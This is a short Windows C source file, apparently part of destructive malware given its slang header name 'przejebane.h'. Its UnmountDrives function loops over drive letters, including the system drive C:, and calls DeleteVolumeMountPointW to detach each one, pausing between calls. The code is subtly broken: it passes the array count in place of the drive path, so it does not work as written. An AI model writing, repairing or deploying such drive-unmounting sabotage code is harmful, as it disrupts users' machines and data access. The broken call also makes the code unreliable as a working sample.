#include "przejebane.h"

BOOL
WINAPI
UnmountDrives(
	VOID
)
{
	PWSTR szDrives[ 6 ] = {
		L"A:\\",
		L"B:\\",
		L"C:\\",
		L"D:\\",
		L"V:\\",
		L"X:\\"
	};

	CONST SIZE_T pccDrives = sizeof( szDrives ) / sizeof( VOID* );

	for ( INT i = 0; i < pccDrives; i++ )
	{
		DeleteVolumeMountPointW( pccDrives );
		Sleep( 100 );
	}
	return TRUE;
}